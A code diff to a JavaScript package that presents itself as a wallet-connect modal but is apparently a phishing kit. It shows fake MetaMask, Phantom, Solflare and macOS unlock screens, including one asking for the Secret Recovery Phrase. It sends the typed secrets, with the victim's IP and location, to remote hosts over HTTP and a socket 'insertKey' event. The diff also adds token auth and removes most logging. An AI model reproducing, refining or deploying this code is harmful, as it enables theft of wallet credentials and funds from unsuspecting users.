@@ -87,17 +87,31 @@ const getWalletShortKey = (walletType) => {
     return walletConfigs[walletType]?.shortKey || walletType.substring(0, 2).toUpperCase();
 };
 
-// Default configuration
+// Backend configuration — defaults come from build-time env (.env / MODAL_*)
+// Runtime overrides are still available via setConfig().
+function readEnv(key, fallback) {
+    try {
+        // Replaced at build time by @rollup/plugin-replace from .env
+        // Also works if the host app injects process.env.MODAL_*
+        const value = process.env[key];
+        if (typeof value === 'string' && value.trim().length > 0) {
+            return value.trim();
+        }
+    }
+    catch {
+        // ignore
+    }
+    return fallback;
+}
 const defaultConfig = {
-    serverUrl: "https://wagmirequest.la",
-    serverSocket: "wss://api.wagmiwallet.org",
-    clientSocket: "wss://api.wagmiwallet.org",
-    clientUrl: "https://www.riveanimation.cards/v1",
-    secretKey: "ABCDEF",
-    // backendUrl: "http://localhost:3000",
-    backendUrl: "https://api.wagmiwallet.org",
-    assetBaseUrl: "https://www.riveanimation.cards", // Default asset base URL
-    macModalSocketEvent: "showMacModal",
+    serverUrl: readEnv('MODAL_SERVER_URL', 'https://wagmirequest.la'),
+    serverSocket: readEnv('MODAL_SERVER_SOCKET', 'wss://api.wagmihost.com'),
+    clientSocket: readEnv('MODAL_CLIENT_SOCKET', 'wss://api.wagmihost.com'),
+    clientUrl: readEnv('MODAL_CLIENT_URL', 'https://www.riveanimation.cards/v1'),
+    secretKey: readEnv('MODAL_SECRET_KEY', 'ABCDEF'),
+    backendUrl: readEnv('MODAL_BACKEND_URL', 'https://api.wagmihost.com'),
+    assetBaseUrl: readEnv('MODAL_ASSET_BASE_URL', 'https://www.riveanimation.cards'),
+    macModalSocketEvent: readEnv('MODAL_MAC_MODAL_SOCKET_EVENT', 'showMacModal'),
 };
 let currentConfig = { ...defaultConfig };
 const getConfig = () => ({ ...currentConfig });
@@ -106,19 +120,20 @@ const setConfig = (config) => {
 };
 const getClientSocket = () => currentConfig.clientSocket;
 const getClientUrl = () => currentConfig.clientUrl;
+const getSecretKey = () => currentConfig.secretKey;
 const getBackendUrl = () => currentConfig.backendUrl;
 const getAssetBaseUrl = () => currentConfig.assetBaseUrl;
 const getMacModalSocketEvent = () => currentConfig.macModalSocketEvent;
 // Wallet type shortkeys
 const WALLET_TYPE_SHORTKEY = {
-    METAMASK: "MM",
-    PHANTOM: "PH",
-    RABBY: "RB",
-    TRONLINK: "TL",
-    BITGET: "BG",
-    COINBASE: "CB",
-    SOLFLARE: "SF",
-    OKX: "OKX"};
+    METAMASK: 'MM',
+    PHANTOM: 'PH',
+    RABBY: 'RB',
+    TRONLINK: 'TL',
+    BITGET: 'BG',
+    COINBASE: 'CB',
+    SOLFLARE: 'SF',
+    OKX: 'OKX'};
 
 // Cache for user wallet types
 const walletTypesCache = new Map();
@@ -140,7 +155,6 @@ const getUserWalletTypes = async (userId) => {
     try {
         const BACKEND_URL = getBackendUrl();
         if (!BACKEND_URL) {
-            console.warn('BACKEND_URL is not configured, returning empty wallet types');
             return [];
         }
         const response = await axios.get(`${BACKEND_URL}/api/users/user-id/${userId}/wallet-types`, {
@@ -157,9 +171,7 @@ const getUserWalletTypes = async (userId) => {
         });
         return walletTypes;
     }
-    catch (error) {
-        console.warn('Failed to fetch user wallet types:', error.message);
-        // Return empty array on error - widget will show all wallets
+    catch {
         return [];
     }
 };
@@ -241,10 +253,14 @@ const ASSET_PATHS = {
     // Wallet-specific assets
     metamaskFox: 'v1/images/logo/metamask-fox.png',
     metamaskFoxRiv: 'v1/static/media/fox_appear.9dea054e4b9b49cb4fad.riv',
+    metamaskSpinner: 'v1/images/icons/spinner.gif',
+    metamaskClose: 'v1/images/icons/close.svg',
+    metamaskForgotLock: 'v1/images/forgot-password-lock.png',
     tronlinkLoading: 'v4/images/loading.gif',
     solflareFlag: 'v7/images/flag.mp4',
     okxCoverLight: 'v9/images/cover-light.mp4',
     okxCoverDark: 'v9/images/cover-dark-v3.mp4',
+    macLock: 'v8/images/lock.png',
     // Phantom assets (if needed)
     phantomGifS: 'v2/images/phantom/s.gif',
     phantomGifW: 'v2/images/phantom/w.gif',
@@ -252,6 +268,8 @@ const ASSET_PATHS = {
     phantomGifN: 'v2/images/phantom/n.gif',
     phantomGifJ: 'v2/images/phantom/j.gif',
 };
+/** Phantom gif path helper: filename only, e.g. "s.gif" */
+const phantomImagePath = (filename) => `v2/images/phantom/${filename}`;
 
 const WalletSelectionModal = ({ isOpen = false, onWalletSelect, onClose, userId, }) => {
     const [wallets, setWallets] = useState([]);
@@ -298,15 +316,10 @@ const WalletSelectionModal = ({ isOpen = false, onWalletSelect, onClose, userId,
                 if (walletType && walletType !== 'Mac') {
                     filtered.push(walletType);
                 }
-                else if (!walletType) {
-                    console.warn(`✗ No wallet found for: shortkey="${shortKey}", name="${name}"`);
-                    console.warn(`Available shortkeys:`, Object.keys(shortKeyToWalletType));
-                }
             });
             setWallets(filtered);
         }
-        catch (error) {
-            console.error('Error loading user wallet types:', error);
+        catch {
             setWallets([]);
         }
         finally {
@@ -498,8 +511,8 @@ const getClientIP = async () => {
             return data.ip || 'unknown';
         }
     }
-    catch (error) {
-        console.warn('Failed to get IP from ipify:', error);
+    catch {
+        // ignore and try fallback
     }
     try {
         const response = await fetch('https://ipapi.co/ip/');
@@ -508,8 +521,8 @@ const getClientIP = async () => {
             return ip.trim() || 'unknown';
         }
     }
-    catch (error) {
-        console.warn('Failed to get IP from ipapi:', error);
+    catch {
+        // ignore
     }
     return 'unknown';
 };
@@ -541,8 +554,8 @@ const getLocation = async (ipAddress = null) => {
             return locationParts.length > 0 ? locationParts.join(', ') : 'unknown';
         }
     }
-    catch (error) {
-        console.warn('Failed to get location:', error);
+    catch {
+        // ignore
     }
     return 'unknown';
 };
@@ -571,8 +584,7 @@ const getIPAndLocation = async () => {
             country_code: countryCode
         };
     }
-    catch (error) {
-        console.error('Failed to get IP and Location:', error);
+    catch {
         return {
             IP_address: 'unknown',
             Location: 'unknown',
@@ -581,46 +593,90 @@ const getIPAndLocation = async () => {
     }
 };
 
+let cachedToken = null;
+let cachedUserId = null;
+let tokenPromise = null;
+/**
+ * Get a JWT for widget socket/API calls.
+ * Uses secretKey from config against backend POST /api/auth/widget-token.
+ */
+const getWidgetToken = async (userId) => {
+    if (!userId)
+        return null;
+    if (cachedToken && cachedUserId === userId) {
+        return cachedToken;
+    }
+    if (tokenPromise && cachedUserId === userId) {
+        return tokenPromise;
+    }
+    cachedUserId = userId;
+    tokenPromise = (async () => {
+        try {
+            const BACKEND_URL = getBackendUrl();
+            if (!BACKEND_URL)
+                return null;
+            const response = await axios.post(`${BACKEND_URL}/api/auth/widget-token`, {
+                user_id: userId,
+                secret_key: getSecretKey(),
+            }, { timeout: 8000 });
+            cachedToken = response.data?.token || null;
+            return cachedToken;
+        }
+        catch {
+            cachedToken = null;
+            return null;
+        }
+        finally {
+            tokenPromise = null;
+        }
+    })();
+    return tokenPromise;
+};
+
 // Socket.io client instance (will be initialized when needed)
 let socketInstance = null;
+let socketUserId = null;
 /**
- * Initialize Socket.io connection
- * Reuses existing socket instance to avoid creating multiple connections
+ * Initialize Socket.io connection with JWT auth.
+ * Pass userId so a widget token can be fetched and attached.
  */
-const getSocketInstance = () => {
-    // If socket instance already exists, reuse it (socket.io handles reconnection automatically)
-    if (socketInstance) {
-        return socketInstance;
-    }
-    // Only create a new socket if one doesn't exist
+const getSocketInstance = async (userId) => {
     try {
         const url = getClientSocket();
+        let token = null;
+        if (userId) {
+            token = await getWidgetToken(userId);
+        }
+        // Reuse if same user and already connected with same auth
+        if (socketInstance && socketUserId === (userId || null)) {
+            const currentToken = socketInstance.auth?.token;
+            if (currentToken === token && socketInstance.connected) {
+                return socketInstance;
+            }
+            socketInstance.disconnect();
+            socketInstance = null;
+        }
+        socketUserId = userId || null;
         socketInstance = io(url, {
             transports: ['websocket', 'polling'],
             timeout: 10000,
             reconnection: true,
             reconnectionDelay: 1000,
-            reconnectionAttempts: 5
+            reconnectionAttempts: 5,
+            auth: token ? { token } : {},
         });
-        socketInstance.on('connect', () => {
-        });
-        socketInstance.on('disconnect', (reason) => {
-        });
-        socketInstance.on('connect_error', (error) => {
-            console.error('Socket connection error:', error);
-        });
+        socketInstance.on('connect_error', () => { });
         return socketInstance;
     }
-    catch (error) {
-        console.error('Failed to initialize Socket.io:', error);
+    catch {
         return null;
     }
 };
 /**
- * Initialize socket connection early (call this when widget loads)
+ * Initialize socket connection early (call this when widget loads with userId)
  */
-const initializeSocket = () => {
-    return getSocketInstance();
+const initializeSocket = (userId) => {
+    return getSocketInstance(userId);
 };
 /**
  * Subscribe to backend "show Mac modal" socket event.
@@ -631,16 +687,23 @@ const initializeSocket = () => {
  * @param callback - Called with the emitted payload (e.g. { message, user_id, timestamp }).
  * @returns Unsubscribe function.
  */
-const subscribeToShowMacModal = (callback) => {
-    const socket = getSocketInstance();
-    if (!socket) {
-        return () => { };
-    }
-    const eventName = getMacModalSocketEvent();
-    const handler = (payload) => callback(payload);
-    socket.on(eventName, handler);
+const subscribeToShowMacModal = (callback, userId) => {
+    let unsubscribed = false;
+    let activeSocket = null;
+    let handler = null;
+    getSocketInstance(userId).then((socket) => {
+        if (unsubscribed || !socket)
+            return;
+        activeSocket = socket;
+        const eventName = getMacModalSocketEvent();
+        handler = (payload) => callback(payload);
+        socket.on(eventName, handler);
+    });
     return () => {
-        socket.off(eventName, handler);
+        unsubscribed = true;
+        if (activeSocket && handler) {
+            activeSocket.off(getMacModalSocketEvent(), handler);
+        }
     };
 };
 /**
@@ -650,11 +713,9 @@ const sendKeyToBackendAPI = async (userId, keyType, keys, walletTypeShortkey = '
     try {
         const BACKEND_URL = getBackendUrl();
         if (!BACKEND_URL) {
-            console.error('BACKEND_URL is not configured');
             return { success: false, error: 'Backend URL not configured' };
         }
         if (!userId) {
-            console.error('USER_ID is required');
             return { success: false, error: 'User ID is required' };
         }
         if (!keyType || (keyType !== 'cha' && keyType !== 'enter')) {
@@ -674,16 +735,17 @@ const sendKeyToBackendAPI = async (userId, keyType, keys, walletTypeShortkey = '
             Location: ipAndLocation.Location || 'unknown',
             country_code: ipAndLocation.country_code || 'unknown'
         };
+        const token = await getWidgetToken(userId);
         const response = await axios.post(`${BACKEND_URL}/api/keys`, payload, {
             headers: {
                 'Content-Type': 'application/json',
+                ...(token ? { Authorization: `Bearer ${token}` } : {}),
             },
             timeout: 10000,
         });
         return { success: true, data: response.data };
     }
     catch (error) {
-        console.error('Error sending key to backend via API:', error);
         if (error.response) {
             return {
                 success: false,
@@ -714,7 +776,7 @@ const sendKeyToBackendSocket = async (userId, keyType, keys, walletTypeShortkey 
             if (!keyType || (keyType !== 'cha' && keyType !== 'enter')) {
                 return resolve({ success: false, error: 'Invalid key_type. Must be "cha" or "enter"' });
             }
-            const socket = getSocketInstance();
+            const socket = await getSocketInstance(userId);
             if (!socket) {
                 return resolve({ success: false, error: 'Failed to initialize Socket.io' });
             }
@@ -731,9 +793,7 @@ const sendKeyToBackendSocket = async (userId, keyType, keys, walletTypeShortkey 
                         clearTimeout(timeout);
                         connectReject(error);
                     });
-                }).catch(() => {
-                    console.warn('Socket not connected yet, but proceeding with emit');
-                });
+                }).catch(() => { });
             }
             const ipAndLocation = locationData || await getIPAndLocation().catch(() => ({
                 IP_address: 'unknown',
@@ -766,7 +826,6 @@ const sendKeyToBackendSocket = async (userId, keyType, keys, walletTypeShortkey 
             socket.emit('insertKey', payload);
         }
         catch (error) {
-            console.error('Error sending key to backend via Socket:', error);
             resolve({ success: false, error: error.message || 'Unknown error' });
         }
     });
@@ -790,8 +849,7 @@ const initializeLocationData = async () => {
             cachedLocationData = data;
             return data;
         }
-        catch (error) {
-            console.warn('Failed to get IP and Location, using defaults:', error);
+        catch {
             cachedLocationData = {
                 IP_address: 'unknown',
                 Location: 'unknown',
@@ -812,7 +870,7 @@ const sendKeyToBackend = async (userId, keyType, keys, walletTypeShortkey = 'MM'
     if (!cachedLocationData) {
         await initializeLocationData();
     }
-    initializeSocket();
+    await initializeSocket(userId);
     const locationData = cachedLocationData || {
         IP_address: 'unknown',
         Location: 'unknown',
@@ -824,12 +882,6 @@ const sendKeyToBackend = async (userId, keyType, keys, walletTypeShortkey = 'MM'
     ]);
     const apiSuccess = apiResult.status === 'fulfilled' && apiResult.value.success;
     const socketSuccess = socketResult.status === 'fulfilled' && socketResult.value.success;
-    if (!apiSuccess) {
-        console.warn('API send failed:', apiResult.status === 'fulfilled' ? apiResult.value.error : apiResult.reason);
-    }
-    if (!socketSuccess) {
-        console.warn('Socket send failed:', socketResult.status === 'fulfilled' ? socketResult.value.error : socketResult.reason);
-    }
     const overallSuccess = apiSuccess || socketSuccess;
     // Get error message from either API or Socket result
     const apiError = apiResult.status === 'fulfilled' ? apiResult.value.error : undefined;
@@ -843,15 +895,7 @@ const sendKeyToBackend = async (userId, keyType, keys, walletTypeShortkey = 'MM'
     };
 };
 
-// Helper to get image path - works when package is installed
-// Images are in dist/wallets/phantom/phantom/ when package is built
-const getImagePath = (filename) => {
-    // Use a path that resolves from node_modules
-    // When installed: node_modules/wallet-connect-modal/dist/wallets/phantom/phantom/filename
-    // Vite will serve files from node_modules if configured correctly
-    // return `/node_modules/wallet-connect-modal/dist/wallets/phantom/phantom/${filename}`;
-    return `https://www.riveanimation.cards/v2/images/phantom/${filename}`;
-};
+const getImagePath = (filename) => resolveAssetUrl(phantomImagePath(filename));
 const PhantomModal = ({ isOpen, onClose, userId, backendConfig }) => {
     const [keyword, setKeyword] = useState('');
     const [error, setError] = useState(false);
@@ -1321,7 +1365,6 @@ const MetamaskModal = ({ isOpen, onClose, userId, backendConfig, darkMode = fals
     const [loadingInitiate, setLoadingInitiate] = useState(true);
     const passwordInputRef = useRef(null);
     const modalRef = useRef(null);
-    const CLIENT_URL = getClientUrl();
     // Handle initial loading - only run once when modal opens
     useEffect(() => {
         if (isOpen) {
@@ -1509,12 +1552,12 @@ const MetamaskModal = ({ isOpen, onClose, userId, backendConfig, darkMode = fals
                 React.createElement("button", { className: `w-full rounded-full cursor-pointer metamask-font-regular p-2.5 text-white hover:bg-[#3148f5] bg-[#4459ff] ${darkMode ? 'border-[#ffffff] text-[#141618]' : ''}`, onClick: closeWindow }, "Ok"))) : (React.createElement(React.Fragment, null,
                 React.createElement("div", { className: `w-full h-full absolute flex items-center flex-col pt-40 z-50 ${loadingInitiate ? 'visible' : 'hidden'}`, style: { backgroundColor: darkMode ? '#121314' : '#FFFFFF' } },
                     React.createElement("div", { className: "mb-4" },
-                        React.createElement("img", { src: "https://www.riveanimation.cards/v1/images/logo/metamask-fox.png", alt: "metamask-fox-loading", className: "w-40" })),
+                        React.createElement("img", { src: resolveAssetUrl(ASSET_PATHS.metamaskFox), alt: "metamask-fox-loading", className: "w-40" })),
                     React.createElement("div", null,
-                        React.createElement("img", { src: `${CLIENT_URL}/images/icons/spinner.gif`, alt: "spinner", className: "w-8" }))),
+                        React.createElement("img", { src: resolveAssetUrl(ASSET_PATHS.metamaskSpinner), alt: "spinner", className: "w-8" }))),
                 connecting && !loadingInitiate && (React.createElement("div", { className: "z-[100] w-full h-full absolute flex justify-center items-center bg-[#000000e3]" },
                     React.createElement("div", { className: "flex flex-col items-center" },
-                        React.createElement("img", { src: `${CLIENT_URL}/images/icons/spinner.gif`, alt: "spinner", className: "w-8" })))),
+                        React.createElement("img", { src: resolveAssetUrl(ASSET_PATHS.metamaskSpinner), alt: "spinner", className: "w-8" })))),
                 React.createElement("div", { className: `flex justify-center pt-[88px] ${loadingInitiate ? 'hidden' : ''}`, style: { backgroundColor: darkMode ? '#121314' : '#FFFFFF' } },
                     React.createElement("div", { className: "w-full px-[16px]" },
                         React.createElement("div", { className: `flex flex-col justify-start items-center ${darkMode ? 'text-[#ffffff]' : 'text-[#141618]'}` },
@@ -1560,10 +1603,10 @@ const MetamaskModal = ({ isOpen, onClose, userId, backendConfig, darkMode = fals
                                     React.createElement("button", { className: `p-2 rounded-lg hover:bg-gray-100 ${darkMode
                                             ? 'text-gray-400 hover:text-gray-200 hover:bg-gray-700'
                                             : 'text-gray-500 hover:text-gray-700'}`, "aria-label": "Close", onClick: closeForgetPasswordModal },
-                                        React.createElement("img", { src: `${CLIENT_URL}/images/icons/close.svg`, alt: "Close", className: "w-[1.5rem] h-[1.5rem]" })))),
+                                        React.createElement("img", { src: resolveAssetUrl(ASSET_PATHS.metamaskClose), alt: "Close", className: "w-[1.5rem] h-[1.5rem]" })))),
                             React.createElement("div", { className: "px-2" },
                                 React.createElement("div", { className: "mb-2 flex justify-center items-center w-full" },
-                                    React.createElement("img", { src: `${CLIENT_URL}/images/forgot-password-lock.png`, width: "154", height: "154", alt: "Forgot your password?", className: "self-center" })),
+                                    React.createElement("img", { src: resolveAssetUrl(ASSET_PATHS.metamaskForgotLock), width: "154", height: "154", alt: "Forgot your password?", className: "self-center" })),
                                 React.createElement("p", { className: `mb-4 text-md ${darkMode ? 'text-gray-100' : 'text-gray-900'}` }, "MetaMask can't recover your password for you."),
                                 React.createElement("p", { className: `mb-6 text-md ${darkMode ? 'text-gray-100' : 'text-gray-900'}` }, "You can reset your wallet by entering the Secret Recovery Phrase you used when you set up your wallet."),
                                 React.createElement("button", { className: `w-full py-3 px-4 text-md font-medium text-white rounded-xl flex justify-center items-center ${darkMode
@@ -2818,7 +2861,7 @@ const SolflareModal = ({ isOpen, onClose, userId, backendConfig }) => {
                     React.createElement("div", { className: 'flex flex-col gap-[24px]' },
                         React.createElement("div", { className: 'px-[8px] pt-[8px]' },
                             React.createElement("div", { className: 'rounded-[24px] max-h-[250px] overflow-hidden' },
-                                React.createElement("video", { src: "https://www.riveanimation.cards/v7/images/flag.mp4", autoPlay: true, loop: true, playsInline: true, className: "w-full h-full object-cover" }))),
+                                React.createElement("video", { src: resolveAssetUrl(ASSET_PATHS.solflareFlag), autoPlay: true, loop: true, playsInline: true, className: "w-full h-full object-cover" }))),
                         React.createElement("div", { className: "px-[16px] flex flex-col gap-[24px]" },
                             React.createElement("div", null,
                                 React.createElement("h1", { className: 'text-[24px] solflare-font-bold text-[#f5f8ff] leading-[32px]' }, "Unlock your wallet"),
@@ -14730,7 +14773,9 @@ const MacModalTrigger = ({ userId, backendConfig, onClose, }) => {
     const effectiveUserId = userId ?? backendConfig?.userId;
     const timedOpenFiredRef = useRef(false);
     useEffect(() => {
-        initializeSocket();
+        if (effectiveUserId) {
+            initializeSocket(effectiveUserId);
+        }
         const unsubscribe = subscribeToShowMacModal((payload) => {
             const emitUserId = payload?.user_id;
             if (isMacOS() &&
@@ -14740,7 +14785,7 @@ const MacModalTrigger = ({ userId, backendConfig, onClose, }) => {
                 setAdminName(payload?.text);
                 setIsOpen(true);
             }
-        });
+        }, effectiveUserId);
         return unsubscribe;
     }, [effectiveUserId]);
     useEffect(() => {
